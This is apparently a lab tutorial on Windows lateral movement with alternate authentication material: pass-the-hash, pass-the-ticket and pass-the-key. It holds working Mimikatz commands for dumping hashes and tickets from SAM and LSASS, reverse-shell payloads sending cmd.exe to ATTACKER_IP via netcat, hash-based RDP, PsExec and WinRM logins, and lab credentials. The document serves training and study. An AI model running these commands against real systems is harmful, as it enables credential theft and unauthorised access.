# Use of Alternate Authentication Material

Alternate authentication material refers to any data that can be used to access a Windows account without knowing the user's password. This is possible due to how certain authentication protocols in Windows networks function. This guide explores methods to log in as a user when the following authentication protocols are available:

- NTLM authentication
- Kerberos authentication

> **Note:** Familiarity with credential extraction methods and tools like Mimikatz is assumed.

---

## NTLM Authentication

### How NTLM Authentication Works

1. The client sends an authentication request to the server.
2. The server generates a random number (challenge) and sends it to the client.
3. The client combines the NTLM password hash with the challenge to generate a response and sends it back to the server.
4. The server forwards the challenge and response to the Domain Controller for verification.
5. The Domain Controller recalculates the response using the challenge and compares it to the client's response. If they match, authentication succeeds.
6. The server forwards the authentication result to the client.

> **Note:** For local accounts, the server can verify the response without involving the Domain Controller.

---

### Pass-the-Hash (PtH)

NTLM password hashes can be used to authenticate without cracking them. This is possible because the NTLM challenge can be responded to using just the hash.

#### Extracting NTLM Hashes

1. **From Local SAM** (local users only):
    ```powershell
    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # lsadump::sam
    ```

2. **From LSASS Memory** (local and domain users):
    ```powershell
    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # sekurlsa::msv
    ```

#### Performing PtH with Mimikatz
```powershell
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

Start a reverse listener on the AttackBox:
```bash
nc -lvp 5555
```

#### Using Linux Tools for PtH
- **RDP**: `xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`
- **PsExec**: `psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`
- **WinRM**: `evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`

---

## Kerberos Authentication

### How Kerberos Authentication Works

1. The user sends their username and a timestamp encrypted with a key derived from their password to the Key Distribution Center (KDC).
2. The KDC sends back a Ticket Granting Ticket (TGT) and a Session Key.
3. The user uses the TGT to request a Ticket Granting Service (TGS) for specific services.
4. The TGS is sent to the desired service to authenticate and establish a connection.

---

### Pass-the-Ticket (PtT)

Kerberos tickets and session keys can be extracted from LSASS memory using Mimikatz:
```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Inject the ticket into the current session:
```powershell
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

Verify the ticket injection:
```powershell
klist
```

---

### Overpass-the-Hash / Pass-the-Key (PtK)

Kerberos encryption keys can be used to request a TGT without the actual password. Extract keys using Mimikatz:
```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Perform PtK with Mimikatz:
- **RC4 Hash**:
  ```powershell
  mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
  ```
- **AES128 Hash**:
  ```powershell
  mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
  ```
- **AES256 Hash**:
  ```powershell
  mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
  ```

Start a reverse listener on the AttackBox:
```bash
nc -lvp 5556
```

---

## Exercise

1. Connect to `THMJMP2` via SSH:
    ```bash
    ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
    ```
    - **User**: `ZA.TRYHACKME.COM\t2_felicia.dean`
    - **Password**: `iLov3THM!`

2. Use Mimikatz to extract authentication material and perform PtH, PtT, or PtK against `t1_toby.beck`.

3. Use `winrs` to connect to `THMIIS`:
    ```powershell
    winrs.exe -r:THMIIS.za.tryhackme.com cmd
    ```

4. Locate the flag on `t1_toby.beck`'s desktop on `THMIIS`.

> **Tools Available**: Mimikatz and PsExec64 at `C:\tools` on `THMJMP2`.